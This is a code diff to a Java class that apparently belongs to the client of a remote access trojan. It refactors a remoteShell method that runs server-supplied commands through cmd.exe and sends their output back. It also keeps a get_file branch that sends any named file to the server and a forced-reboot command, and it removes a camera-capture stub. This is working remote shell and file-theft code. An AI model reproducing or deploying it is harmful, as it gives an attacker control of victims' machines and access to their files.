@@ -11,7 +11,6 @@ import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.nio.file.StandardCopyOption;
 import java.util.ArrayList;
-import java.util.Random;
 
 /**
  * methods to control a windows machine
@@ -33,6 +32,14 @@ public class WindowsCommandSet extends CommandSet
 
     /**
      * allows the server to control a local shell on the client
+     *
+     * Remote Shell Protocol
+     * =====================
+     * 1. send the clients username to the server
+     * 2. send the current directory to the server (first time the temp path is sent)
+     * 3. read string from the server, if it isn't the terminate string then...
+     * 4. run the command provided and update the current directory if needed
+     * 5. send any output of the command to the server as a string, or end of command if no output
      */
     @Override
     public void remoteShell()
@@ -41,20 +48,14 @@ public class WindowsCommandSet extends CommandSet
         String workingDirectory = getTempPath();
         sendStringToServer(workingDirectory);
         String inputCommand;
-        // Remote Shell Protocol...
-        //
-        // send working directory path to server
-        // if(any output from command)
-        //     send output to server
-        // else
-        //     send end marker to server
+
         while(!(inputCommand = getCommandFromServer()).equals(REMOTE_SHELL_TERMINATE))
         {
             try
             {
                 if(inputCommand.startsWith(REMOTE_SHELL_TRANSFER))
                 {
-                    String filePathToTransfer = inputCommand.split("\\s+")[1]; // get_file thefile
+                    String filePathToTransfer = inputCommand.split("\\s+")[1]; // `get_file thefilename`
                     sendFile(new File(workingDirectory + File.separator + filePathToTransfer));
                     continue;
                 }
@@ -63,15 +64,10 @@ public class WindowsCommandSet extends CommandSet
                 String[] command = {"cmd.exe", "/c", "cd " + workingDirectory + "& " + inputCommand + " & cd"};
                 Process process = getRuntime().exec(command);
 
-                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-                ArrayList<String> fullOutput = new ArrayList<>(); // used later so we can get pwd output and track out workingDirectory
-                String result;
-                while((result = reader.readLine()) != null)
-                    fullOutput.add(result + "\n");
-
+                ArrayList<String> fullOutput = getStreamData(new BufferedReader(new InputStreamReader(process.getInputStream())));
                 workingDirectory = fullOutput.get(fullOutput.size() - 1).replace("\n", ""); // this is pwd's output. Used to keep track of working dir as we have to have a new process for each command given
                 sendStringToServer(workingDirectory);
-                fullOutput.remove(fullOutput.size() - 1);
+                fullOutput.remove(fullOutput.size() - 1); // remove trailing newline
                 if(!fullOutput.isEmpty()) // if the cmd created output in stdout we must let server know so it can read the stdout
                 {
                     sendStringToServer(REMOTE_SHELL_INDICATE_STDOUT);
@@ -81,9 +77,7 @@ public class WindowsCommandSet extends CommandSet
 
                 // print any errors back to server
                 fullOutput.clear();
-                reader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
-                while((result = reader.readLine()) != null)
-                    fullOutput.add(result + "\n");
+                fullOutput = getStreamData(new BufferedReader(new InputStreamReader(process.getErrorStream())));
                 if(!fullOutput.isEmpty()) // if cmd created output in stderr we must tell the server so it can read the error
                 {
                     sendStringToServer(REMOTE_SHELL_INDICATE_STDERR);
@@ -297,12 +291,6 @@ public class WindowsCommandSet extends CommandSet
     public void restart() throws IOException
     {
         getRuntime().exec("shutdown /F /R /T 0");
-    }
-
-    @Override
-    public void takeCameraPicture()
-    {
-
     }
 
     /**
